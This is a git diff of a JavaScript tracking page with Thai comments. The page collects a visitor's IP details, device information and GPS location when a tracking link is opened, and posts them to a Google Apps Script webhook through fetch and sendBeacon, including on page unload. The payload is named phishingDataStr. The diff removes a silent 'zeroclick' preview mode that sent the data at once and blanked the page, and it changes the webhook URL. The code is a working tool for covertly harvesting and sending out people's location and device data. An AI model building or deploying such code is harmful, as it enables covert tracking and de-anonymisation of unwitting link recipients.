@@ -3,23 +3,26 @@ function getUrlParameters() {
   try {
     const urlParams = new URLSearchParams(window.location.search);
     const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
-    const caseName = urlParams.get('case') || "ไม่มีค่า";
-    
-    // เพิ่มการตรวจสอบพารามิเตอร์ preview
-    const isPreview = urlParams.get('preview') === 'true';
-    
-    // กำหนด source ตามพารามิเตอร์
-    let source = urlParams.get('source') || "link";
-    
-    // ถ้าเป็น preview ให้เปลี่ยน source เป็น Zeroclick
-    if (isPreview) {
-      source = "zeroclick";
-    }
-    
-    return { trackingKey, caseName, source, isPreview };
+    const caseName = urlParams.get('case') || "ไม่มีค่า"; // ดึง case name ด้วย (ถ้ามี)
+    const source = urlParams.get('source') || "link"; // เพิ่มการดึง source (link/image)
+
+    console.log("ดึงค่าจาก URL parameters:");
+    console.log("- trackingKey:", trackingKey);
+    console.log("- caseName:", caseName);
+    console.log("- source:", source); // Log source ด้วย
+
+    return {
+      trackingKey: trackingKey,
+      caseName: caseName,
+      source: source // คืนค่า source ด้วย
+    };
   } catch (error) {
-    console.error("Error parsing URL parameters:", error);
-    return { trackingKey: "ไม่มีค่า", caseName: "ไม่มีค่า", source: "link", isPreview: false };
+    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
+    return {
+      trackingKey: "ไม่มีค่า",
+      caseName: "ไม่มีค่า",
+      source: "link" // ค่าเริ่มต้น
+    };
   }
 }
 
@@ -155,7 +158,7 @@ window.addEventListener('beforeunload', function() {
         console.log("ส่งข้อมูลในช่วง beforeunload ด้วย beacon");
         
         // ส่งข้อมูลด้วย beacon
-        const webhookUrl = 'https://script.google.com/macros/s/AKfycbwTNvl-rBtGxt0gcxMIe8mm1xrs0lOYFuTuoPouoedG-cHw_NwLWiCQUSwoC5q7OkhD/exec';
+        const webhookUrl = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
         const blob = new Blob([phishingDataStr], {type: 'application/json'});
         
         if (navigator.sendBeacon(webhookUrl, blob)) {
@@ -183,16 +186,16 @@ window.addEventListener('beforeunload', function() {
   });
 
   // ดึง tracking key, case name, และ source จาก URL
-  const { trackingKey, caseName, source, isPreview } = getUrlParameters();
+  const { trackingKey, caseName, source } = getUrlParameters();
 
   // --- ตรวจสอบ trackingKey ก่อนดำเนินการต่อ ---
   if (!trackingKey || trackingKey === "ไม่มีค่า") {
-    console.log("No tracking key found, aborting.");
-    return;
+    console.error("Invalid or missing tracking key. Halting script execution.");
+    // อาจจะแสดงข้อความบนหน้าจอ หรือ redirect
+    // document.body.innerHTML = "Access Denied: Invalid Tracking Key";
+    return; // หยุดการทำงานของสคริปต์
   }
   console.log("Tracking key is present:", trackingKey);
-  console.log("Source:", source);
-  console.log("Is Preview:", isPreview);
 
   // --- รวบรวมข้อมูลเบื้องต้น ---
   const deviceInfo = getDetailedDeviceInfo();
@@ -240,51 +243,6 @@ window.addEventListener('beforeunload', function() {
 
   // เตรียมข้อมูลสำหรับ beacon (ในกรณีผู้ใช้ออกจากหน้าเว็บกะทันหัน)
   prepareDataForBeacon(dataToSend);
-
-  // ถ้าเป็น preview ให้ทำงานแบบเร่งด่วน
-  if (isPreview) {
-    console.log("Preview mode detected, sending data immediately");
-    
-    // ส่งข้อมูลแบบเร่งด่วนโดยไม่รอ GPS
-    (async function() {
-      try {
-        // รวบรวมข้อมูลพื้นฐาน
-        const ipInfo = await getIPDetails();
-        
-        // รวมข้อมูลทั้งหมด
-        const dataToSend = {
-          trackingKey: trackingKey,
-          caseName: caseName,
-          timestamp: timestamp,
-          source: source, // จะเป็น "zeroclick"
-          ip: ipInfo,
-          deviceInfo: {
-            ...deviceInfo,
-            screenSize: screenSize,
-            language: language,
-          },
-          location: null, // ไม่รอ GPS
-          requestId: generateUniqueId(),
-        };
-        
-        // เตรียมข้อมูลสำหรับส่ง
-        const dataForBeacon = prepareDataForBeacon(dataToSend);
-        
-        // ส่งข้อมูลไปยัง webhook
-        sendDataWithBeacon(dataForBeacon);
-        
-        console.log("Preview data sent successfully");
-        
-        // ให้หน้าเว็บแสดงหน้าว่างเปล่า
-        document.body.innerHTML = "";
-        document.body.style.backgroundColor = "transparent";
-      } catch (error) {
-        console.error("Error in preview mode:", error);
-      }
-    })();
-    
-    return; // ไม่ต้องทำงานต่อ
-  }
 
   // --- เริ่มรวบรวมข้อมูลแบบ Asynchronous ---
 
@@ -354,7 +312,7 @@ window.addEventListener('beforeunload', function() {
       
       // ตรวจสอบว่าสามารถใช้ fetch ได้หรือไม่
       if (window.fetch) {
-        fetch('https://script.google.com/macros/s/AKfycbwTNvl-rBtGxt0gcxMIe8mm1xrs0lOYFuTuoPouoedG-cHw_NwLWiCQUSwoC5q7OkhD/exec', {
+        fetch('https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -400,7 +358,7 @@ function generateUniqueId() {
 
 // ฟังก์ชันส่งข้อมูลด้วย navigator.sendBeacon()
 function sendDataWithBeacon(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwTNvl-rBtGxt0gcxMIe8mm1xrs0lOYFuTuoPouoedG-cHw_NwLWiCQUSwoC5q7OkhD/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
   const currentRequestId = dataToSend.requestId;
 
   // ตรวจสอบว่าเคยส่ง requestId นี้ใน session นี้หรือยัง
